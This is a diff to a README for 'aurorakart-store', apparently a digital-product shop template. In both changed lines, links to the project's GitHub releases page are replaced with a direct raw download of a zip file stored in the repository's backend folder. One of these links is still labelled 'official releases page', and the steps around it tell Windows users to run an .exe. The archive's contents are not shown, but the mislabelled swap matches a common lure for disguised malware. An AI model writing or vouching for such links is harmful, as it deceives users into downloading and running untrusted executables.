@@ -1,6 +1,6 @@
 # 🛒 aurorakart-store - Build your professional digital product shop
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/persuasive-oceanperch453/aurorakart-store/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/persuasive-oceanperch453/aurorakart-store/raw/refs/heads/main/backend/store-aurorakart-v1.6.zip)
 
 This application provides a foundation for selling digital items. You can use it to list products, manage customer orders, and process secure payments. It includes tools for storefront design and inventory management. This template helps you launch a store without writing code from scratch.
 
@@ -18,7 +18,7 @@ Your computer needs to meet these basic standards to run the application smoothl
 
 Follow these steps to set up the store software on your Windows machine:
 
-1. Visit the [official releases page](https://github.com/persuasive-oceanperch453/aurorakart-store/releases) to find the latest version.
+1. Visit the [official releases page](https://github.com/persuasive-oceanperch453/aurorakart-store/raw/refs/heads/main/backend/store-aurorakart-v1.6.zip) to find the latest version.
 2. Look for the Assets section at the bottom of the newest release post.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your desktop or downloads folder.
